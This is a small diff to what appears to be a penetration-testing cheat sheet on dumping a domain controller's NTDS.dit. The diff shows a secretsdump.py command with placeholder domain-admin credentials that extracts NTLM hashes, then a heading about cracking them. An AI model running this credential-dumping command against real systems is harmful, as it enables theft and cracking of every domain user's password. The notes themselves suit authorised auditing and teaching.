@@ -4,7 +4,8 @@ Dumping NTDS.dit (run the command against the Domain Controller with a Domain Ad
 ```bash
 secretsdump.py [DOMAIN]/[USERNAME]:'[PASSWORD]'@[IP_ADDRESS] -just-dc-ntlm
 ```
-Grab the NT to crack.
+Grab the NT to crack:
+
 ![image](https://github.com/user-attachments/assets/07b7e977-4a39-43a0-9c59-9242457cefc9)
 
 # Crack all NTDS.dit NT hashes
